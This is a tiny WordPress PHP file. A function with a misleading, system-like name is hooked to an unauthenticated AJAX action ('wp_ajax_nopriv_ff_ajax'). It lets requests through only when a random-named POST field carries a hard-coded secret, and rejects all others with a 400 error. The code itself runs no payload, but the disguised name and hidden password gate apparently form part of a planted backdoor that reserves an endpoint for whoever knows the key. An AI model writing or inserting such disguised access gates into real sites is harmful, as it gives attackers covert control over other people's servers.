<?php

function scheduled_reloaded_system_shortcode() {
	if (!isset($_POST["audumgcbcoadtds"]) || $_POST["audumgcbcoadtds"] !== "uX92ywOuaEgx2B9") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'scheduled_reloaded_system_shortcode', 5, 1);
